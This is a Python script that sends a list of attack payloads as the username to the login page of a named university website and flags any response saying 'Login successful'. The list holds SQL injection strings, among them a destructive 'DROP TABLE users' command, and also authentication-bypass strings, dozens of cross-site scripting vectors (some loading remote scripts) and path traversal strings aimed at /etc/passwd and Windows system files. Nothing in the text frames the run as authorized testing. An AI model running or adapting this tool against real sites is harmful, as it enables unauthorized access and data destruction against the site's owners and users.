import requests

# Define the target URL
target_url = "https://arjang.ac.ir/user/login"

# Define a list of payloads to be fuzzed
payloads = [
    "' OR 1=1 --",
    "<script>alert('XSS')</script>",
    "'; DROP TABLE users; --",
    "admin' OR '1'='1",
    "<svg/onload=alert('XSS')>",
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "../../../../boot.ini",
    "../../../../../etc/hosts",
    "%%30%30",
    "%%30%30%30",
    "\"><script>alert('XSS')</script>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<svg><script>alert('XSS')</script></svg>",
    "<img src=x onerror=alert('XSS')>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x:x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "javascript:alert(\"XSS\")",
    "data:text/html,<script>alert(\"XSS\")</script>",
    "><script>alert('XSS')</script>",
    "<a href='http://www.example.com'>",
    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
    "<iframe/onreadystatechange=alert('XSS')></iframe>",
    "<script src=http://www.example.com/xss.js></script>",
    "><script>alert(document.cookie)</script>",
    "<iframe src=http://www.example.com></iframe>",
    "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
    "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
    "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
    "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
    "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    "<IMG SRC=\"javascript:alert('XSS')\"",
    "<BODY ONLOAD=alert('XSS')>",
    "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
    "<svg><script xlink:href=data:,alert(1)></script></svg>",
    "<svg><script x:href='data:,alert(1)'></script></svg>",
    "<iframe srcdoc='&lt;svg onload=alert(1)&gt;'></iframe>",
    "<svg onload='javascript:alert(1)'></svg>",
    "<a href='jAvAsCrIpT:alert(1)'>Click me</a>",
    "<img src=x onerror=alert(1) />",
    "<svg onload=alert(1) //'>",
    "<svg/onload=alert`1`>",
    "<a href='http://foo.com/'>bar</a><img src='x' onerror='alert(1)'>",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
    "<SCRIPT/SRC=\"data:text/javascript,alert('XSS');\"></SCRIPT>",
    "<BODY ONLOAD=alert('XSS')>",
    "<iframe/onreadystatechange=alert('XSS')></iframe>",
    "<svg/onload=\"alert(document.domain)\">",
    "<svg/onload=alert('XSS')>",
    "<IMG SRC=# onmouseover=\"alert('XSS')\">",
    "<SCRIPT/XSS SRC=\"http://www.example.com/xss.js\"></SCRIPT>",
    "<iframe src='vbscript:alert(\"XSS\")'></iframe>",
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
    "<IMG SRC='jav&#x0D;ascript:alert(\"XSS\");'>",
    "<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
    "<iframe src='mocha:[code]'></iframe>",
    "<a href=\"javascript:alert('XSS');\">Click here</a>",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
    "<img src=JaVaScRiPt:alert('XSS')>",
    "<audio src onloadstart=\"alert('XSS')\">",
    "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
    "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
    "<IMG SRC=javascript:alert('XSS')>",
    "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
    "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K'>",
    "<iframe srcdoc='&lt;svg onload=\"alert(1)\"&gt;'></iframe>",
    "<svg><script>//&NewLine;confirm(document.domain)//&NewLine;</script></svg>",
    "<iframe srcdoc='&lt;img src=x onerror=alert(1)&gt;'></iframe>",
    # Add more payloads for various types of injections, buffer overflows, etc.
]

# Function to fuzz the target URL with payloads
def fuzz_url(url, payload):
    try:
        # Send a POST request with the payload
        response = requests.post(url, data={"username": payload, "password": "password"})

        # Check the response for any indications of successful exploitation
        if "Login successful" in response.text:
            print("[+] Vulnerability found: " + payload)
        else:
            print("[-] No vulnerability found for payload: " + payload)
    except Exception as e:
        print("[-] Error occurred: " + str(e))

# Iterate over payloads and fuzz the target URL
for payload in payloads:
    fuzz_url(target_url, payload)
